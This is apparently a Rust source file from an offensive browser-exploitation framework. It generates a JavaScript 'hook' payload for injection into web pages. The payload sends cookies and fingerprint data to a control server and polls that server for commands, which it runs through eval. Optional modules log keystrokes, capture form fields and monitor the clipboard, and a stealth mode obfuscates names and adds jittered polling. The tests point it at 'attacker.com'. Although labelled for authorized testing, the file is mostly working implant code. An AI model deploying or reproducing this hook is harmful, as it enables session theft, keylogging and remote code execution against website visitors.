//! JavaScript Hook Payload Generation
//!
//! Generates browser-side control agent for the RBB (RedBlue Browser) framework.
//! FOR AUTHORIZED SECURITY TESTING ONLY.

/// Default script tag for injection
pub const DEFAULT_HOOK_TAG: &str = "<script src=\"/hook.js\"></script>";

/// Configuration for hook generation
#[derive(Debug, Clone)]
pub struct HookConfig {
    /// Polling interval in milliseconds (randomized +/- 20%)
    pub poll_interval_ms: u32,
    /// Enable keylogger module
    pub keylogger: bool,
    /// Enable form grabber
    pub form_grabber: bool,
    /// Enable clipboard monitoring
    pub clipboard: bool,
    /// Obfuscate variable names
    pub obfuscate: bool,
    /// Enable debug logging to console
    pub debug: bool,
}

impl Default for HookConfig {
    fn default() -> Self {
        Self {
            poll_interval_ms: 2000,
            keylogger: false,
            form_grabber: false,
            clipboard: false,
            obfuscate: false,
            debug: false,
        }
    }
}

impl HookConfig {
    /// Create config for stealth operation
    pub fn stealth() -> Self {
        Self {
            poll_interval_ms: 3000,
            keylogger: false,
            form_grabber: false,
            clipboard: false,
            obfuscate: true,
            debug: false,
        }
    }

    /// Create config with all modules enabled
    pub fn full() -> Self {
        Self {
            poll_interval_ms: 2000,
            keylogger: true,
            form_grabber: true,
            clipboard: true,
            obfuscate: false,
            debug: false,
        }
    }
}

/// Generate the hook.js payload with default configuration
pub fn generate_hook_js(server_url: &str) -> String {
    generate_hook_js_with_config(server_url, &HookConfig::default())
}

/// Generate hook.js with server-assigned session ID (for same-origin MITM mode)
///
/// This version uses a session ID provided by the server via cookie, ensuring
/// session correlation between the hook and server-side tracking.
pub fn generate_hook_js_with_session(server_url: &str, session_id: &str) -> String {
    generate_hook_js_with_session_and_config(server_url, session_id, &HookConfig::default())
}

/// Generate hook.js with server-assigned session and custom config
pub fn generate_hook_js_with_session_and_config(
    server_url: &str,
    session_id: &str,
    config: &HookConfig,
) -> String {
    let debug_log = if config.debug {
        "function _log(m) { console.log('[RB] ' + m); }"
    } else {
        "function _log(m) {}"
    };

    let keylogger_module = if config.keylogger {
        r#"
    // Keylogger Module
    let _keys = [];
    document.addEventListener('keypress', function(e) {
        _keys.push({ k: e.key, t: Date.now(), el: e.target.tagName });
        if (_keys.length >= 20) {
            _send('/keylog', { keys: _keys });
            _keys = [];
        }
    });
    _log('Keylogger active');
"#
    } else {
        ""
    };

    let form_grabber_module = if config.form_grabber {
        r#"
    // Form Grabber Module
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const data = {};
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(function(inp) {
            if (inp.name && inp.type !== 'password') {
                data[inp.name] = inp.value;
            } else if (inp.type === 'password') {
                data[inp.name || 'password'] = '[REDACTED]';
            }
        });
        _send('/form', { action: form.action, method: form.method, fields: data });
        _log('Form captured: ' + form.action);
    }, true);
"#
    } else {
        ""
    };

    let clipboard_module = if config.clipboard {
        r#"
    // Clipboard Monitor
    document.addEventListener('copy', function(e) {
        const text = window.getSelection().toString();
        if (text) _send('/clipboard', { type: 'copy', content: text.substring(0, 1000) });
    });
    document.addEventListener('paste', function(e) {
        const text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) _send('/clipboard', { type: 'paste', content: text.substring(0, 1000) });
    });
"#
    } else {
        ""
    };

    // Variable names (can be obfuscated)
    let (v_server, v_session, v_send, v_poll, v_exec) = if config.obfuscate {
        ("_s", "_i", "_p", "_q", "_e")
    } else {
        ("SERVER_URL", "SESSION_ID", "_send", "_poll", "_exec")
    };

    // This version uses server-assigned session ID instead of generating one
    format!(
        r#"(function(){{
    {debug_log}
    const {v_server}="{server_url}";
    const {v_session}="{session_id}";
    _log('Hook loaded (server session): '+{v_session});

    function {v_send}(ep,d){{
        fetch({v_server}+ep,{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{...d,id:{v_session},session_id:{v_session}}})
        }}).catch(function(){{}});
    }}

    // Fingerprint
    {v_send}('/init',{{
        ua:navigator.userAgent,
        loc:window.location.href,
        cookie:document.cookie,
        host:window.location.hostname,
        platform:navigator.platform,
        screen:screen.width+'x'+screen.height,
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.language,
        plugins:Array.from(navigator.plugins||[]).map(function(p){{return p.name;}}).join(','),
        webgl:(function(){{try{{var c=document.createElement('canvas');return c.getContext('webgl').getParameter(c.getContext('webgl').RENDERER);}}catch(e){{return 'n/a';}}}})()
    }});

    // Poll with jitter
    function {v_poll}(){{
        fetch({v_server}+'/poll?id='+{v_session})
            .then(function(r){{return r.json();}})
            .then(function(cmds){{
                if(cmds&&cmds.length>0)cmds.forEach({v_exec});
            }})
            .catch(function(){{}});
        var jitter=Math.floor(Math.random()*{poll_jitter})-{poll_jitter_half};
        setTimeout({v_poll},{poll_interval}+jitter);
    }}
    setTimeout({v_poll},{poll_interval});

    // Execute command
    function {v_exec}(cmd){{
        _log('Exec: '+cmd.name);
        try{{
            var fn=new Function(cmd.script);
            var res=fn();
            {v_send}('/response',{{cmd_id:cmd.id,output:res?String(res):'OK',error:false}});
        }}catch(e){{
            {v_send}('/response',{{cmd_id:cmd.id,output:String(e),error:true}});
        }}
    }}

    // Built-in commands exposed globally
    window._rb={{
        alert:function(m){{alert(m);return 'shown';}},
        redirect:function(u){{window.location=u;return 'redirecting';}},
        cookie:function(){{return document.cookie;}},
        html:function(){{return document.documentElement.outerHTML.substring(0,50000);}},
        storage:function(){{return JSON.stringify(localStorage);}},
        exec:function(js){{return eval(js);}}
    }};
    {keylogger_module}{form_grabber_module}{clipboard_module}
    // SPA Navigation Observer
    var _lastUrl=location.href;
    new MutationObserver(function(){{
        if(location.href!==_lastUrl){{
            _lastUrl=location.href;
            {v_send}('/navigate',{{url:_lastUrl}});
            _log('Navigation: '+_lastUrl);
        }}
    }}).observe(document.body,{{subtree:true,childList:true}});
}})();"#,
        debug_log = debug_log,
        server_url = server_url,
        session_id = session_id,
        v_server = v_server,
        v_session = v_session,
        v_send = v_send,
        v_poll = v_poll,
        v_exec = v_exec,
        poll_interval = config.poll_interval_ms,
        poll_jitter = config.poll_interval_ms / 5,
        poll_jitter_half = config.poll_interval_ms / 10,
        keylogger_module = keylogger_module,
        form_grabber_module = form_grabber_module,
        clipboard_module = clipboard_module,
    )
}

/// Generate hook.js with custom configuration
pub fn generate_hook_js_with_config(server_url: &str, config: &HookConfig) -> String {
    let debug_log = if config.debug {
        "function _log(m) { console.log('[RB] ' + m); }"
    } else {
        "function _log(m) {}"
    };

    let keylogger_module = if config.keylogger {
        r#"
    // Keylogger Module
    let _keys = [];
    document.addEventListener('keypress', function(e) {
        _keys.push({ k: e.key, t: Date.now(), el: e.target.tagName });
        if (_keys.length >= 20) {
            _send('/keylog', { keys: _keys });
            _keys = [];
        }
    });
    _log('Keylogger active');
"#
    } else {
        ""
    };

    let form_grabber_module = if config.form_grabber {
        r#"
    // Form Grabber Module
    document.addEventListener('submit', function(e) {
        const form = e.target;
        const data = {};
        const inputs = form.querySelectorAll('input, select, textarea');
        inputs.forEach(function(inp) {
            if (inp.name && inp.type !== 'password') {
                data[inp.name] = inp.value;
            } else if (inp.type === 'password') {
                data[inp.name || 'password'] = '[REDACTED]';
            }
        });
        _send('/form', { action: form.action, method: form.method, fields: data });
        _log('Form captured: ' + form.action);
    }, true);
"#
    } else {
        ""
    };

    let clipboard_module = if config.clipboard {
        r#"
    // Clipboard Monitor
    document.addEventListener('copy', function(e) {
        const text = window.getSelection().toString();
        if (text) _send('/clipboard', { type: 'copy', content: text.substring(0, 1000) });
    });
    document.addEventListener('paste', function(e) {
        const text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) _send('/clipboard', { type: 'paste', content: text.substring(0, 1000) });
    });
"#
    } else {
        ""
    };

    // Variable names (can be obfuscated)
    let (v_server, v_session, v_send, v_poll, v_exec) = if config.obfuscate {
        ("_s", "_i", "_p", "_q", "_e")
    } else {
        ("SERVER_URL", "SESSION_ID", "_send", "_poll", "_exec")
    };

    format!(
        r#"(function(){{
    {debug_log}
    const {v_server}="{server_url}";
    const {v_session}=localStorage.getItem('rb_sid')||Math.random().toString(36).substr(2,12);
    localStorage.setItem('rb_sid',{v_session});
    _log('Hook loaded: '+{v_session});

    function {v_send}(ep,d){{
        fetch({v_server}+ep,{{
            method:'POST',
            headers:{{'Content-Type':'application/json'}},
            body:JSON.stringify({{...d,id:{v_session},session_id:{v_session}}})
        }}).catch(function(){{}});
    }}

    // Fingerprint
    {v_send}('/init',{{
        ua:navigator.userAgent,
        loc:window.location.href,
        cookie:document.cookie,
        host:window.location.hostname,
        platform:navigator.platform,
        screen:screen.width+'x'+screen.height,
        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
        lang:navigator.language,
        plugins:Array.from(navigator.plugins||[]).map(function(p){{return p.name;}}).join(','),
        webgl:(function(){{try{{var c=document.createElement('canvas');return c.getContext('webgl').getParameter(c.getContext('webgl').RENDERER);}}catch(e){{return 'n/a';}}}})()
    }});

    // Poll with jitter
    function {v_poll}(){{
        fetch({v_server}+'/poll?id='+{v_session})
            .then(function(r){{return r.json();}})
            .then(function(cmds){{
                if(cmds&&cmds.length>0)cmds.forEach({v_exec});
            }})
            .catch(function(){{}});
        var jitter=Math.floor(Math.random()*{poll_jitter})-{poll_jitter_half};
        setTimeout({v_poll},{poll_interval}+jitter);
    }}
    setTimeout({v_poll},{poll_interval});

    // Execute command
    function {v_exec}(cmd){{
        _log('Exec: '+cmd.name);
        try{{
            var fn=new Function(cmd.script);
            var res=fn();
            {v_send}('/response',{{cmd_id:cmd.id,output:res?String(res):'OK',error:false}});
        }}catch(e){{
            {v_send}('/response',{{cmd_id:cmd.id,output:String(e),error:true}});
        }}
    }}

    // Built-in commands exposed globally
    window._rb={{
        alert:function(m){{alert(m);return 'shown';}},
        redirect:function(u){{window.location=u;return 'redirecting';}},
        cookie:function(){{return document.cookie;}},
        html:function(){{return document.documentElement.outerHTML.substring(0,50000);}},
        storage:function(){{return JSON.stringify(localStorage);}},
        exec:function(js){{return eval(js);}}
    }};
    {keylogger_module}{form_grabber_module}{clipboard_module}
    // SPA Navigation Observer
    var _lastUrl=location.href;
    new MutationObserver(function(){{
        if(location.href!==_lastUrl){{
            _lastUrl=location.href;
            {v_send}('/navigate',{{url:_lastUrl}});
            _log('Navigation: '+_lastUrl);
        }}
    }}).observe(document.body,{{subtree:true,childList:true}});
}})();"#,
        debug_log = debug_log,
        server_url = server_url,
        v_server = v_server,
        v_session = v_session,
        v_send = v_send,
        v_poll = v_poll,
        v_exec = v_exec,
        poll_interval = config.poll_interval_ms,
        poll_jitter = config.poll_interval_ms / 5, // +/- 20%
        poll_jitter_half = config.poll_interval_ms / 10,
        keylogger_module = keylogger_module,
        form_grabber_module = form_grabber_module,
        clipboard_module = clipboard_module,
    )
}

/// Generate a minified version of the hook (strips whitespace)
pub fn generate_hook_js_minified(server_url: &str) -> String {
    let js = generate_hook_js_with_config(server_url, &HookConfig::stealth());
    // Basic minification: remove newlines and extra spaces
    js.lines()
        .map(|l| l.trim())
        .filter(|l| !l.is_empty())
        .collect::<Vec<_>>()
        .join("")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_hook_contains_server_url() {
        let js = generate_hook_js("http://attacker.com:3000");
        assert!(js.contains("http://attacker.com:3000"));
    }

    #[test]
    fn test_hook_has_init_endpoint() {
        let js = generate_hook_js("http://test");
        assert!(js.contains("/init"));
        assert!(js.contains("/poll"));
        assert!(js.contains("/response"));
    }

    #[test]
    fn test_hook_config_keylogger() {
        let config = HookConfig {
            keylogger: true,
            ..Default::default()
        };
        let js = generate_hook_js_with_config("http://test", &config);
        assert!(js.contains("keypress"));
        assert!(js.contains("/keylog"));
    }

    #[test]
    fn test_hook_config_form_grabber() {
        let config = HookConfig {
            form_grabber: true,
            ..Default::default()
        };
        let js = generate_hook_js_with_config("http://test", &config);
        assert!(js.contains("submit"));
        assert!(js.contains("/form"));
    }

    #[test]
    fn test_minified_smaller() {
        let normal = generate_hook_js("http://test");
        let minified = generate_hook_js_minified("http://test");
        assert!(minified.len() < normal.len());
    }

    #[test]
    fn test_obfuscation() {
        let config = HookConfig {
            obfuscate: true,
            ..Default::default()
        };
        let js = generate_hook_js_with_config("http://test", &config);
        // Obfuscated version should not have readable variable names
        assert!(!js.contains("SERVER_URL"));
        assert!(!js.contains("SESSION_ID"));
    }
}
